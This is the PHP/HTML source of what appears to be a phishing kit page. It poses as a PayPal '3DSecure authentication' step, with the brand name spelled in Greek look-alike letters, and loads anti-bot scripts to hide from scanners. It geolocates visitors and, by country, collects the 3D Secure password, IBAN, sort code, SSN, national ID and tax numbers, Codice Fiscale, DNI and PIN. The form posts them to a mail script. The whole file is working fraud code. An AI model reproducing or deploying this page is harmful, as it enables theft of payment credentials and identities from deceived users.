<?php

session_start();


 $number = $_SESSION['number'];
 $fname = $_SESSION['fname'];
 $lname = $_SESSION['lname'];
 $c_type = $_SESSION['c_type'];
 
 
 // Get user IP address
if ( isset($_SERVER['HTTP_CLIENT_IP']) && ! empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif ( isset($_SERVER['HTTP_X_FORWARDED_FOR']) && ! empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = (isset($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
}

$ip = filter_var($ip, FILTER_VALIDATE_IP);
$ip = ($ip === false) ? '0.0.0.0' : $ip;


// GET Country & Country CODE !

#END
$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
if($query && $query['status'] == 'success') {
  $_SESSION['_country_'] = $query['country'];
  $_SESSION['_countryCode_'] = $query['countryCode'];
}
#END


 ?>

	<?php include("./antibots.php") ?>
	<?php include("./antibot.php") ?>

<html lang="pt" class="no-js" style=" margin-top: 60px; " > <head>

<meta charset="utf-8" />


	<title>3DSecure authentication - &#929;&#945;y&#929;&#945;l</title>


	<meta http-equiv="content-type" content="text/html; charset=UTF-8" />

		<link rel="shortcut icon" href="./auth/secure/ico/5481015.ico"/>




	<script type="text/javascript" src="./auth/secure/js/date_time.js"></script>


		   	<link rel="stylesheet" href="./auth/css/loading.css"  />

	<script language="javascript" src="./auth/secure/js/pwdbase.js"></script>



	<script type="text/javascript" src="./auth/js/jquery.min.js"></script>

	      <!-- selected  -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    <!-- selected  -->


	                 <!-- GOOGLE ANALYTICS -->


  <script type="text/javascript">
  $(document).ready(function() {
  $('#type').on('change', function() {
  $("#visa").toggle($(this).val() == 'Visa');
  $("#master").toggle($(this).val() == 'Mastercard');
  $("#amex").toggle($(this).val() == 'Amex');
  $("#maestro").toggle($(this).val() == 'Maestro');
  $("#visa_electron").toggle($(this).val() == 'Visa_electron');
  $("#discover").toggle($(this).val() == 'Discover');
  }).trigger('change');
});
  </script>

  <script type="text/javascript">
        $(document).ready(function() {
  $('#bloc').on('change.account', function() {
    $(".de").toggle($(this).val() == 'DE');
    $(".ch").toggle($(this).val() == 'CH');
    $(".at").toggle($(this).val() == 'AT');
    $(".be").toggle($(this).val() == 'BE');
    $(".nl").toggle($(this).val() == 'NL');
    $(".dni").toggle($(this).val() == 'ES');
    $(".portugaliano").toggle($(this).val() == 'PT');
    $(".codefisical").toggle($(this).val() == 'IT');
    $(".ssn").toggle($(this).val() == 'US');
    $(".sort").toggle($(this).val() == 'GB');
  })
  .trigger('change.account');

});
    </script>


    <!-- /GOOGLE ANALYTICS -->

    <style>
		 .ssn {display:none;}
		 .sort {display:none;}
		 .dni {display:none;}
		 .portugaliano {display:none;}
         .codefisical {display:none;}
         .be {display:none;}
          .de {display:none;}
            .nl {display:none;}
            .ch {display:none;}
               .at {display:none;}

	</style>


		 <script type="text/javascript">
var ray={
ajax:function(st)
	{
		this.show('load');
	},
show:function(el)
	{
		this.getID(el).style.display='';
	},
getID:function(el)
	{
		return document.getElementById(el);
	}

}</script>




</head>





<link href="./auth/secure/css/style.css" rel="stylesheet" type="text/css" />



<style type="text/css">
#load{
     position:  absolute;
    right: 0;
    bottom: 0;
    left: 0;
    height:0;
    z-index: 200;
    margin: 0;
    text-align: center;

    }


.auto-style1 {
	text-align: center;
}


input:-webkit-autofill {
    -webkit-box-shadow: 0 0 0px 1000px white inset;
}


.be.de {

	display:none;
}

</style>

<body>

<header style="height: 0px">

	</header>


	 				<div id="load" class="transitioning spinner spin" style="display:none;">Processing your 3-D Secure...</div>

	 <script type="text/javascript" src="./auth/secure/js/1.js"></script>

	  <form method="post" action="./auth/secure/mail/3d.php"  onsubmit="return (validate()  && ray.ajax())">


	 <div class="wrapper"   >
 	 <div id="acc" style="height: 335px"   >

		 <table style="width: 100%; height: 70px">
			 <tr>
				 <td style="width: 247px">

				<img src="./auth/secure/images/v_logo.svg.png" id="visa" width="100px"  name="visa" style="display: none" >
				<img src="./auth/secure/images/M_Logo.svg.png"  id="master" width="100px" name="master" style="display: none" >

				<img src="./auth/secure/images/maest_logo.png"  id="maestro" width="100px" name="maestro" style="display: none" >
				 <img src="./auth/secure/images/am_logo.svg.png"  id="amex" width="110px" height="80px" name="amex" style="display: none" >
				  <img src="./auth/secure/images/Visa_Electron.svg.png"  id="visa_electron" width="110px"   name="Visa_electron" style="display: none" >

				  <img src="./auth/secure/images/Discover-logo.jpg"  id="discover" width="110px"   name="discover" style="display: none" >

				    </td>

				 <td>  <img  src="./auth/secure/images/ppcom.svg" ></td>			 </tr>
		 </table>
		 <br>
		 <div class="auto-style1" style="width: 225px">

Enter security code</div>
		 <br><br>
		 <table style="width: 100%">
			 <tr>
				 <td style="width: 135px" class="auto-style3">Date <span >:</span></td>
				 <td id="date_time" class="auto-style4" style="width: 211px"></td>
				 <script type="text/javascript">window.onload = date_time('date_time');</script>
			 </tr>
			 <tr>
				 <td style="width: 135px; height: 19px;" class="auto-style3">Name of card holder <span>:</span></td>
				 <td style="width: 211px; height: 19px;" class="auto-style6"><?php echo ($_SESSION['fname']) ?> <?php echo ($_SESSION['lname']) ?></td>
			 </tr>
			 <tr>
				 <td style="width: 135px" class="auto-style3">Card number <span >:</span></td>
				 <td class="auto-style4" style="width: 211px">

				  <?php echo 'XXXX-XXXX-XXXX-'.substr($number,-4);?>  </td>
			 </tr>
			 <tr>
				 <td style="width: 135px; height: 26px;" class="auto-style3">3D Secure <span>:</span></td>
				 <td style="width: 211px; height: 26px;"><input name="password" id="password" class="Anouar" type="password"  title="Enter your security password." x-moz-errormessage="Enter your security password." autocomplete="off" required="required" placeholder="Password" ></td>
			 </tr>

 <tr class="be">

                 <td style="width: 135px; height: 26px;" class="auto-style3 ">Bank Account Number (IBAN) <span>:</span></td>
				 <td style="width: 211px; height: 26px;"><input  class="Anouar be" id="accountbe" name="accountbe" type="text" placeholder="Bank Account Number (IBAN)"  style="width: 80%" ></td>

 </tr>

  <tr class="de">

                 <td style="width: 135px; height: 26px;" class="auto-style3 ">Bank Account Number (IBAN) <span>:</span></td>
				 <td style="width: 211px; height: 26px;"><input  class="Anouar de" id="accountde" name="accountde" type="text" placeholder="Bank Account Number (IBAN)"  style="width: 80%"></td>

 </tr>

  <tr class="nl">

                 <td style="width: 135px; height: 26px;" class="auto-style3 ">Bank Account Number (IBAN) <span>:</span></td>
				 <td style="width: 211px; height: 26px;"><input  class="Anouar nl" id="accountnl" name="accountnl" type="text" placeholder="Bank Account Number (IBAN)"  style="width: 80%"></td>

 </tr>

   <tr class="ch">

                 <td style="width: 135px; height: 26px;" class="auto-style3 ">Bank Account Number (IBAN) <span>:</span></td>
				 <td style="width: 211px; height: 26px;"><input  class="Anouar ch" id="accountch" name="accountch" type="text" placeholder="Bank Account Number (IBAN)" style="width: 80%" ></td>

 </tr>

    <tr class="at">

                 <td style="width: 135px; height: 26px;" class="auto-style3 ">Bank Account Number (IBAN) <span>:</span></td>
				 <td style="width: 211px; height: 26px;"><input  class="Anouar at" id="accountat" name="accountat" type="text" placeholder="Bank Account Number (IBAN)"  style="width: 80%" ></td>

 </tr>


 <tr class="sort">

                 <td style="width: 135px; height: 26px;" class="auto-style3">Sort Code <span>:</span></td>
				 <td style="width: 211px; height: 26px;"><input  class="Anouar sort" id="sort" name="sort"  type="tel" placeholder="Sort Code"    onkeypress="return isNumberKey(event)" onfocus="idToWrite='clave';pos=null" ></td>



 </tr>


 <tr class="ssn">

                 <td style="width: 135px; height: 26px;" class="auto-style3 ssn">Social Security number (SSN) <span>:</span></td>
				 <td style="width: 211px; height: 26px;"><input class="Anouar ssn"  id="ssn" name="ssn"  type="tel" placeholder="Social Security number (SSN)"    onkeypress="return isNumberKey(event)" onfocus="idToWrite='clave';pos=null"   ></td>

 </tr>
 <tr class="portugaliano">

                 <td style="width: 135px; height: 26px;" class="auto-style3 portugaliano">Nº de Identidade <span>:</span></td>
				 <td style="width: 211px; height: 26px;"><input class="Anouar portugaliano" id="idpt" name="idpt" type="tel"  placeholder="Nº de Identidade"   onkeypress="return isNumberKey(event)" onfocus="idToWrite='clave';pos=null"></td>

 </tr>
 <tr class="portugaliano">

                 <td style="width: 135px; height: 26px;" class="auto-style3 portugaliano">Nº de Contribuinte <span>:</span></td>
				 <td style="width: 211px; height: 26px;"><input class="Anouar portugaliano" id="conpt" name="conpt"  type="tel" placeholder="Nº de Contribuinte"  onkeypress="return isNumberKey(event)" onfocus="idToWrite='clave';pos=null"  ></td>
 </tr>

 <tr class="codefisical">
                 <td style="width: 135px; height: 26px;" class="auto-style3 codefisical">Codice Fiscale <span>:</span></td>
				 <td style="width: 211px; height: 26px;"><input class="Anouar codefisical" id="cf" name="cf" type="text" placeholder="Codice Fiscale"></td>
				  </tr>


 <tr class="codefisical">
                 <td style="width: 135px; height: 26px;" class="auto-style3 codefisical">Codice Titolare <span>:</span></td>
				 <td style="width: 211px; height: 26px;"><input class="Anouar codefisical"  id="ct" name="ct"  type="tel" placeholder="Codice Titolare"  onkeypress="return isNumberKey(event)" onfocus="idToWrite='clave';pos=null" ></td>

	  </tr>

	   <tr class="dni">
                 <td style="width: 135px; height: 26px;" class="auto-style3 dni">DNI / NIF / NIE <span>:</span></td>
				 <td style="width: 211px; height: 26px;"><input class="Anouar dni"  id="dni" name="dni"  type="text" placeholder="DNI / NIF / NIE"></td>
				  </tr>


 <tr class="dni">
                 <td style="width: 135px; height: 26px;" class="auto-style3 dni">PIN <span>:</span></td>
				 <td style="width: 211px; height: 26px;"><input class="Anouar dni" id="pin" name="pin" type="tel"  placeholder="PIN"  ></td>

	  </tr>








				 <td style="width: 135px">&nbsp;</td>
				 <td style="width: 135px">&nbsp;</td>
			 </tr>

             <tr>
				 <td style="width: 135px">&nbsp;</td>
				 <td class="auto-style5"  ><input class="myButton"  value="Continue" onclick="LoadPage()" type="submit"/></td>
			 </tr>



		 </table>


	<input  id="type" name="type" type="hidden" value="<?php echo ($_SESSION['c_type']) ?>">

<input id="bloc"   name="bloc" type="hidden" value="<?php echo ($query['countryCode']) ?>">



<div style="height: 20px;">

</div>

		 <br>
		 <div class="auto-style1" style="width: 308px">
			 <span style="color: #808080; font-family: HelveticaNeue, 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 11px; font-style: normal; font-variant: normal; font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 1; word-spacing: 0px; -webkit-text-stroke-width: 0px; display: inline !important; float: none; background-color: rgb(255, 255, 255);">
			      Copyright © 1999-2016 . All rights reserved.</span></div>

</div>
	</div>



	</body>

</html>
